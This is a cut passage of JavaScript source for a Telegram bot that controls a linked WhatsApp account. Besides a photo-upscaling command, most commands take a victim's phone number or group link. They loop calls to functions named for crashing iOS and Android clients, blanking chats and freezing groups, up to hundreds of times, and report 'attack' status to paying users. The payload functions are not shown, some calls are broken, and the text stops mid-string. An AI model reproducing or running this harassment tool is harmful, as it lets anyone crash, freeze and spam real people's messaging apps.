    // Download foto ke buffer
    const response = await fetch(fileUrl);
    const buffer = Buffer.from(await response.arrayBuffer());

    // Upload ke PicWish API
    const form = new FormData();
    form.append("image_file", buffer, { filename: "image.jpg" });
    form.append("type", "clean"); // "clean" = umum, "face" = wajah
    form.append("scale_factor", "4"); // 4 = 4x lebih besar

    const upscaleRes = await fetch("https://api.picwish.com/v1/photo-enhancer", {
      method: "POST",
      body: form,
    });

    const result = await upscaleRes.json();
    if (!result.image_url) throw new Error();

    // Kirim hasil
    await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id);
    await ctx.replyWithPhoto(result.image_url, {
      caption: "✅ *Foto berhasil ditingkatkan kualitasnya!*",
    });
  } catch (err) {
    console.error("HD Error:", err);
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      "❌ Gagal memproses foto. Coba foto lain atau coba lagi nanti."
    );
  }
});
// ================= CONNECT ================= //
bot.command("connect", checkOwner, async (ctx) => {
  try {
    if (!sock) {
      return ctx.reply("❌ Socket belum siap. Silahkan ketik /restart lalu setelah itu melakukan /connect kembali.");
    }

    if (isWhatsAppConnected && sock.user) {
      return ctx.reply("✅ WhatsApp sudah terhubung.");
    }

    if (global.pairingMessage) {
      return ctx.reply("⚠️ Pairing masih aktif, tunggu dulu.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
      return ctx.reply("🪧 Example:\n/connect 628xxxx");
    }

    let phoneNumber = args[1].replace(/[^0-9]/g, "");

    
    if (phoneNumber.startsWith("08")) {
      phoneNumber = "62" + phoneNumber.slice(1);
    }

    
    if (phoneNumber.length < 8 || phoneNumber.length > 15) {
      return ctx.reply("❌ Nomor tidak valid.\nGunakan kode negara.\n\nExample:\n/connect 628xxxx");
    }

    await new Promise(r => setTimeout(r, 1000));

    const code = await sock.requestPairingCode(phoneNumber);
    if (!code) return ctx.reply("❌ Gagal ambil pairing code.");

    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

    const msg = await ctx.replyWithPhoto(
      "https://gangalink.vercel.app/i/u7kr25xn.jpg",//ganti jadi url catbox gambar lu
      {
        caption:
`
<blockquote><i>------ [ REQUEST PAIRING BY GXION ] ------</i></blockquote>
<b>Nomor Target Pairing</b> : <code>${phoneNumber}</code>
<b>Kode Pairing Target</b> : <code>${formattedCode}</code>

<blockquote>SEDANG MENGHUBUNGKAN KE APLIKASI WHATSAPP JANGAN TUTUP APLIKASI AGAR BISA MENGHUBUNGKAN !!</blockquote>
`,
        parse_mode: "HTML"
      }
    );

    global.pairingMessage = {
      chatId: msg.chat.id,
      messageId: msg.message_id
    };

    setTimeout(() => {
      global.pairingMessage = null;
    }, 60000);

  } catch (err) {
    console.log("Pairing error FULL:", err);
    global.pairingMessage = null;
    ctx.reply("❌ Gagal pairing, Coba lakukan /killsesi, setelah itu /restart lalu melakukan connect kembali!");
  }
});



// ================= KILL SESSION ================= //
bot.command("killsesi", checkOwner, async (ctx) => {
  try {
    if (sock) {
      try {
        await sock.logout();
      } catch {}
      sock = null;
    }

    const deleted = deleteSession();
    global.pairingMessage = null;

    if (deleted) {
      ctx.reply("🗑️ Session berhasil dihapus, Silahkan ketik /restart lalu setelah itu /connect kembali untuk menghubungkan Sender atau Bot");
    } else {
      ctx.reply("⚠️ Session tidak ditemukan");
    }

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal hapus session ketik /restart lalu setelah itu killsesi kembali");
  }
});
/// ============= CASE BUG 9 BEBAS SPAM=============\\\
bot.command(
  "xmonroe",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /xmonroe 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithPhoto(
  "https://files.catbox.moe/exbatv.jpg",
  {
    caption: `
<blockquote>⬡═—⊱ GXION EXECUTING ⊰—═⬡</blockquote>
<code>🔥 MODE : BEBAS SPAM BUGS</code>
<blockquote>☖ Target Number : ${q}
☖ Status : Success
☖ Executor : ${username}
☖ Effect : Delay X bebas Spam bugs</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "📱- チェック",
            url: `https://wa.me/${q}`,
            style: "primary"
          }
        ]
      ]
    }
  }
);

    (async () => {
      for (let i = 0; i < 1; i++) {
       console.log(
          chalk.yellow(`EKSEKUSI /xmonroe SIAP DI KIRIM UNTUK TARGET ${q}`)
        );
        await VnXNewDelayHardInpis(sock, target);
        await combox(sock, target);
        await sleep(1000);
      }
    })();

  }
);
/// ============= CASE BUG 9 BEBAS SPAM=============\\\
bot.command(
  "balancedxlay",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /balancedxlay 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithPhoto(
  "https://files.catbox.moe/338m2f.jpg",
  {
    caption: `
<blockquote>⬡═—⊱ GXION EXECUTING ⊰—═⬡</blockquote>
<code>🔥 MODE : BEBAS SPAM BUGS</code>
<blockquote>☖ Target Number : ${q}
☖ Status : Success
☖ Executor : ${username}
☖ Effect : Delay X bebas Spam bugs</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "📱- チェック",
            url: `https://wa.me/${q}`,
            style: "primary"
          }
        ]
      ]
    }
  }
);
    (async () => {
      for (let i = 0; i < 1; i++) {
       console.log(
          chalk.red(`SUCCESS PLAYLOAD BUGS TO ${q}`)
        );       
        await Dileymbut(sock, target);
        await VnXNewDelayHardInpis(sock, target);
        await sleep(1000);
      }
    })();

  }
);
/// ============= CASE BUG 9 BEBAS SPAM=============\\\
bot.command(
  "flowerxdelay",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /flowerxdelay 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithPhoto(
  "https://files.catbox.moe/kd39kf.jpg",
  {
    caption: `
<blockquote>⬡═—⊱ GXION EXECUTING ⊰—═⬡</blockquote>
<code>🔥 MODE : BEBAS SPAM BUGS</code>
<blockquote>☖ Target Number : ${q}
☖ Status : Success
☖ Executor : ${username}
☖ Effect : Delay X bebas Spam bugs</blockquote> 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "📱- チェック",
            url: `https://wa.me/${q}`,
            style: "primary"
          }
        ]
      ]
    }
  }
);
    (async () => {
      for (let i = 0; i < 1; i++) {
       console.log(
          chalk.red(`SUCCESS PLAYLOAD BUGS TO ${q}`)
        );        
        await Dileymbut(sock, target);
        await sleep(1000);
      }
    })();

  }
);
/// ============= CASE BUG 9 BEBAS SPAM=============\\\
bot.command(
  "bugsxios",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /bugsxios 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`✅ Bugsxioas (bug) selesai mengirim untuk : ${q}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "☇ Check Target",
                url: `https://wa.me/${q}`,
                style: "danger"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 2; i++) {
        console.log(
          chalk.red(`PROSES FORCECLOSE IOS TO ${q}`)
        );
        await iosinpis(sock, target);
        await sleep(1500);
      }
    })();

  }
);
/// ============= CASE BUG 9 BEBAS SPAM=============\\\
bot.command(
  "superbug",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /superbug 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`✅ Eksekusi superbug (bug) selesai mengirim untuk : ${q}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "☇ Check Target",
                url: `https://wa.me/${q}`,
                style: "success"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 5; i++) {
        console.log(
          chalk.red(`PROSES BUG ${i + 1} SEND TO ${q}`)
        );
        await EARLDelay(sock, target);
        await sleep(1000);
      }
    })();

  }
);
/// ============= CASE BUG 5 BEBAS SPAM=============\\\
bot.command("xios", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) {
      return ctx.reply("🪧 ☇ Example : /xios 62xx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const username = ctx.from.username || ctx.from.first_name;
    const time = new Date().toLocaleTimeString("id-ID");

    await ctx.reply(
`<blockquote><i>|=—& INFORMATION ATTACK &—=|</i></blockquote>
<b>Target :</b> [ ${q} ]
<b>Type   :</b> [ CRASH IOS ]
<b>Status :</b> [ PROCESSING... ]
<b>Loop   :</b> [ Sedang Memasak ]

<blockquote><b>//*NO SPAM BUGS, THIS COMMAND IS VISIBLE BUG*//</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "CEK TARGET", url: `https://wa.me/${q}` }
            ]
          ]
        }
      }
    );

    // jalanin loop async tanpa ngeblok bot
    (async () => {
      try {
        if (typeof VnXCrashIos !== "function") {
          return console.error("VnXCrashIos function not found");
        }
        if (!sock) {
          return console.error("Socket (sock) not initialized");
        }

        for (let r = 0; r < 200; r++) {
          await VnXCrashIos(sock, target);
          await sleep(2000);
        }

      } catch (err) {
        console.error("Error dalam loop:", err);
      }
    })();

  } catch (err) {
    console.error("Error pada Command:", err);
    ctx.reply("❌ Terjadi error saat menjalankan command");
  }
});
  
/// ============= CASE BUG 5 BEBAS SPAM=============\\\
bot.command(
  "velixiry",
  checkAllPremium,
  checkWhatsAppConnection,
  checkCooldown,
  async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /velixiry 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
      `✅ velixiry selesai mengirim (bug) untuk <code>${q}</code>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "☇ Check Target",
                url: `https://wa.me/${q}`,
                style: "primary"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 20; i++) {
        console.log(
          chalk.red(`PROSES SENDING BUG COMBO DELAY 💀 ${i + 1} TO ${q}`)
        );

        await delayreza(sock, target);
        await sleep(1500);
      }
    })();

  }
);
/// CASE BUG \\\
bot.command("xnull", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /xnull 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
      `✅ Success mengirim xnull (bug) untuk target: ${q}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "☇ Check Target",
                url: `https://wa.me/${q}`,
                style: "primary"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 15; i++) {
        console.log(
          chalk.red(` DELAY HARD CLOCK SEND TO💀 TO ${q}`)
        )
        await(sock, target);
        await sleep(1500);
      }
    })();

  }
);
/// ============= CASE BUG 10 BEBAS SPAM =============\\\
bot.command("apibug", checkAllPremium, checkCooldown, async (ctx) => {
  const input = ctx.message.text.split(" ")[1];

  if (!input) {
    return ctx.reply("Cara Penggunaan : /apibug 62xx");
  }

  const q = input.replace(/[^0-9]/g, "");
  const target = `${q}@s.whatsapp.net`;

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";

  await ctx.reply(
`<blockquote><code>⬡═―⊱ INFORMATION ⊰―═⬡</code></blockquote>
Target : ${q}
User : ${username}
Type : Bebas Spam No Sender
Status : Success Sending ✓
<blockquote>◍ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢxɪᴏɴ ᴛᴇᴀᴍ</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Cek ☇ Target",
              url: `https://wa.me/${q}`,
              style: "primary"
            }
          ]
        ]
      }
    }
  );

  const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

  (async () => {
    try {
      for (let i = 0; i < 5; i++) {
        console.log(
          chalk.yellow(`PROSES MENGIRIM BUG KEPADA TARGET 🌸  ${i + 1} -> ${q}`)
          );
          
        await(target);
        await sleep(2000);
      }
    } catch (err) {
      console.error("Error:", err);
    }
  })();
});
/// ============= CASE BUG 10 BEBAS SPAM =============\\\
bot.command("xapi", checkAllPremium, checkCooldown, async (ctx) => {
  const input = ctx.message.text.split(" ")[1];

  if (!input) {
    return ctx.reply("Cara Penggunaan : /xapi 62xx");
  }

  const q = input.replace(/[^0-9]/g, "");
  const target = `${q}@s.whatsapp.net`;

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";

  await ctx.reply(
`<blockquote><code>⬡═―⊱ INFORMATION ⊰―═⬡</code></blockquote>
Target : ${q}
User : ${username}
Type : Bebas Spam No Sender
Status : Success Sending ✓
<blockquote>◍ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢxɪᴏɴ ᴛᴇᴀᴍ</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Cek ☇ Target",
              url: `https://wa.me/${q}`,
              style: "danger"
            }
          ]
        ]
      }
    }
  );

  const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

  (async () => {
    try {
      for (let i = 0; i < 5; i++) {
        console.log(
          chalk.red(`PROSES MENGIRIM BUG TO TARGET  ${i + 1} -> ${q}`)
          );
          
        await(target);
        await sleep(2000);
      }
    } catch (err) {
      console.error("Error:", err);
    }
  })();
});
/// ============= CASE BUG 10 BEBAS SPAM=============\\\
bot.command("xtlz", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  // Definisikan thumbnailUrl2 dengan URL gambar dari Catbox
  const thumbnailUrl2 = "https://files.catbox.moe/u9jrve.jpg"; // Ganti dengan URL asli milikmu

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xtlz 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dengan foto (thumbnailUrl2 sebagai gambar)
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ GXION ⟣━⟡
⌑ Target: ${q}
⌑ Type: Fc click android
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "🔍CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  // Loop pengiriman VN crash (50x)
  for (let i = 0; i < 20; i++) {
    await VnxKayzenIsHere(sock, target, true);
    await jadavo(sock, target);
    await sleep(5000);
  }

  // Edit pesan menjadi sukses
  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ GXION⟣━⟡
⌑ Target: ${q}
⌑ Type: Fc click android
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "🔍 CEK TARGET", url: `https://wa.me/${q}`, style: "primary" }
      ]]
    }
  });
});
/// ============= CASE BUG 10 BEBAS SPAM=============\\\
bot.command("onehitxblank", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  // Definisikan thumbnailUrl2 dengan URL gambar dari Catbox
  const thumbnailUrl2 = "https://files.catbox.moe/p6ahc6.jpg"; // Ganti dengan URL asli milikmu

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /onehitxblank 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dengan foto (thumbnailUrl2 sebagai gambar)
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<blockquote>⟡━⟢ GXION ⟣━⟡</blockquote>
⌑ Target: ${q}
⌑ Type: Blank Ui One Hit
⌑ Status: Executing
<blockquote>╘═——————————————═⬡</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "ᴄʜᴇᴄᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  // Loop pengiriman VN crash (50x)
  for (let i = 0; i < 10; i++) {
    await Ui(sock, target);
    await VnXNewChatLock(sock, target);
    await sleep(3000);
  }

  // Edit pesan menjadi sukses
  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⟡━⟢ GXION⟣━⟡</blockquote>
⌑ Target: ${q}
⌑ Type: Blank Ui One Hit
⌑ Status: Success
<blockquote>╘═——————————————═⬡</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "ᴄʜᴇᴄᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}`, style: "primary" }
      ]]
    }
  });
});
/// ============= CASE BUG 10 BEBAS SPAM=============\\\
bot.command("delaybrutalx", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  // Definisikan thumbnailUrl2 dengan URL gambar dari Catbox
  const thumbnailUrl2 = "https://files.catbox.moe/joc26i.jpg"; // Ganti dengan URL asli milikmu

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /delaybrutalx 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dengan foto (thumbnailUrl2 sebagai gambar)
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ GXION ⟣━⟡
⌑ Target: ${q}
⌑ Type: Super delay combo (WORK)
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  // Loop pengiriman VN crash (50x)
  for (let i = 0; i < 10; i++) {
    await VnXNewDelayHardInpis(sock, target);
    await BlankXDelay(sock, target);
    await combox(sock, target);
    await EARLDelay(sock, target);
    await sleep(2000);
  }

  // Edit pesan menjadi sukses
  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ GXION⟣━⟡
⌑ Target: ${q}
⌑ Type: Super delay combo (WORK)
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "primary" }
      ]]
    }
  });
});
/// ============= CASE BUG 10 BEBAS SPAM=============\\\
bot.command("superblank", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  // Definisikan thumbnailUrl2 dengan URL gambar dari Catbox
  const thumbnailUrl2 = "https://files.catbox.moe/5lrxrf.jpg"; // Ganti dengan URL asli milikmu

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /superblank 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dengan foto (thumbnailUrl2 sebagai gambar)
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ GXION ⟣━⟡
⌑ Target: ${q}
⌑ Type: Blank Android 
⌑ Status: Processing
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CLICK UNTUK CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  // Loop pengiriman VN crash
  for (let i = 0; i < 50; i++) {
    await VnXNewChatLock(sock, target);
    await sleep(2000);
  }

  // Edit pesan menjadi sukses
  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ GXION⟣━⟡
⌑ Target: ${q}
⌑ Type: Blank Android
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CLICK UNTUK CEK TARGET", url: `https://wa.me/${q}`, style: "primary" }
      ]]
    }
  });
});
/// ============= CASE BUG 10 BEBAS SPAM=============\\\
bot.command("xcombo", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  // Definisikan thumbnailUrl2 dengan URL gambar dari Catbox
  const thumbnailUrl2 = "https://files.catbox.moe/u9jrve.jpg"; // Ganti dengan URL asli milikmu

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /
  xcombo 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dengan foto (thumbnailUrl2 sebagai gambar)
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ GXION ⟣━⟡
⌑ Target: ${q}
⌑ Type: Combo all bugs 
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 チェック", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  // Loop pengiriman VN crash (50x)
  for (let i = 0; i < 2; i++) {
    await VnxKayzenIsHere(sock, target, true);
    await jadavo(sock, target);
    await VnXNewChatLock(sock, target);
    await fcclick(sock, target);
    await infinityfrezee(sock, target);
    await Ui(sock, target);
    await sleep(7000);
  }

  // Edit pesan menjadi sukses
  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ GXION⟣━⟡
⌑ Target: ${q}
⌑ Type: Combo all bugs
⌑ Status: Success
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "📱 チェック", url: `https://wa.me/${q}`, style: "primary" }
      ]]
    }
  });
});
/// ============= CASE BUG 10 BEBAS SPAM=============\\\
bot.command("xattack", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  // Definisikan thumbnailUrl2 dengan URL gambar dari Catbox
  const thumbnailUrl2 = "https://files.catbox.moe/u9jrve.jpg"; // Ganti dengan URL asli milikmu

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xattack 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Kirim pesan proses dengan foto (thumbnailUrl2 sebagai gambar)
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">⟡━⟢ GXION ⟣━⟡
⌑ Target: ${q}
⌑ Type: Forceclose Click 
⌑ Status: Mengirim
╘═——————————————═⬡</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "PROSES MENGIRIM ♻️", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  // Loop pengiriman VN crash (50x)
  for (let i = 0; i < 35; i++) {
    await fcclick(sock, target);
    await infinityfrezee(sock, target);
    await VnXNewFOrceImageNoClick(sock, target, true);
    await sleep(2500);
  }

  // Edit pesan menjadi sukses
  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">⟡━⟢ GXION⟣━⟡
⌑ Target: ${q}
⌑ Type: Forceclosw Click
⌑ Status: Berhasil
╘═——————————————═⬡</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "SUKSES MENGIRIM ✅", url: `https://wa.me/${q}`, style: "primary" }
      ]]
    }
  });
});
// ===== OPTIONAL SAFE SOCK (BIAR GA ERROR) =====
function createSafeSock(sock) {
  if (!sock) return null;
  return {
    sendMessage: sock.sendMessage?.bind(sock),
    relayMessage: sock.relayMessage?.bind(sock),
    groupMetadata: sock.groupMetadata?.bind(sock),
  };
}
// ================= EXTRACT GROUP ID =================
function extractGroupID(link = "") {

  try {

    const regex = /chat\.whatsapp\.com\/([0-9A-Za-z]+)/i;

    const match = link.match(regex);

    if (!match) return null;

    return match[1];

  } catch {
    return null;
  }
}

// ===== COMMAND BUG GROUP=====
bot.command("attackgc", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const chatId = ctx.chat.id;

  try {

    const text = ctx.message?.text || "";
    const args = text.split(" ");

    // ===== VALIDASI =====
    if (args.length < 2) {
      return ctx.reply("🪧 Example : /attackgc https://chat.whatsapp.com/xxxx");
    }

    const groupLink = args[1]?.trim();

    if (!groupLink.includes("chat.whatsapp.com")) {
      return ctx.reply("❌ Link group tidak valid");
    }

    // ===== FOTO =====
    const photoUrl = "https://files.catbox.moe/mzdou3.jpg";

    // ===== PROCESS MESSAGE =====
    const processMsg = await ctx.replyWithPhoto(photoUrl, {
      caption: `
\`\`\`js
┏━━━〔 BLANK GROUP ATTACK 〕━━━┓
⟡ Target  :: GROUP BUGS
⟡ Type    :: FREEZE GROUP TYPE
⟡ Status  :: ▓▒░ Processing...
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "🔍 Check Group",
              url: groupLink,
              style: "danger"
            }
          ]
        ]
      }
    });

    const processMessageId = processMsg.message_id;

    // ===== AMBIL CODE GROUP =====
    const groupCode = extractGroupID(groupLink);

    if (!groupCode) {
      return ctx.reply("❌ Gagal mengambil ID group");
    }

    // ===== AMBIL INFO =====
    const groupInfo = await sock.groupGetInviteInfo(groupCode);

    if (!groupInfo?.id) {
      return ctx.reply("❌ Group tidak ditemukan");
    }

    // ===== EXECUTE =====
    for (let i = 0; i < 30; i++) {
      
      try {

        await FreezeGorup(sock, target);

      } catch (e) {
        console.log("BUG ERROR:", e.message);
      }

      await new Promise(r => setTimeout(r, 250));
    }

    // ===== DONE =====
    const finalText = `
\`\`\`js
┏━━━〔 BLANK GROUP ATTACK 〕━━━┓
⟡ Target  :: GROUP BUGS
⟡ Type    :: FREEZE GROUP TYPE
⟡ Status  :: √ SUKSES...
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\`\`\``;

    try {

      await ctx.telegram.editMessageCaption(
        chatId,
        processMessageId,
        null,
        finalText,
        {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "🔍 Check Group",
                  url: groupLink,
                  style: "success"
                }
              ]
            ]
          }
        }
      );

    } catch {

      await ctx.replyWithPhoto(photoUrl, {
        caption: finalText,
        parse_mode: "Markdown"
      });
    }

  } catch (err) {

    console.error("BLANKGROUP ERROR:", err);

    ctx.reply(
      `❌ Terjadi error : ${err.message}`
    );
  }
});
// ===== COMMAND TES FUNCTION=====
bot.command("testbug", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const chatId = ctx.chat.id;

  try {
    const text = ctx.message?.text || "";
    const args = text.split(" ");

    // ===== VALIDASI =====
    if (args.length < 3) {
      return ctx.reply("🪧 Example : /testbug 62xxx 10 (reply your function)");
    }

    const q = args[1];
    let jumlah = Math.max(1, Math.min(parseInt(args[2]) || 1, 1000));

    if (isNaN(jumlah)) {
      return ctx.reply("❌ Jumlah harus angka");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    if (!ctx.message.reply_to_message?.text) {
      return ctx.reply("❌ Reply dengan function");
    }

    // ===== FOTO (LINK) =====
    const photoUrl = "https://gangalink.vercel.app/i/r1468jak.jpg"; // bebas ganti sama url foto kamu

    // ===== SEND PROCESS =====
    const processMsg = await ctx.replyWithPhoto(photoUrl, {
      caption: `
\`\`\`js
┏━━━〔 INFORMATION ATTACK 〕━━━┓
⟡ Target  :: ${q}
⟡ Type    :: Unknown Function
⟡ Status  :: ▓▒░ Processing...
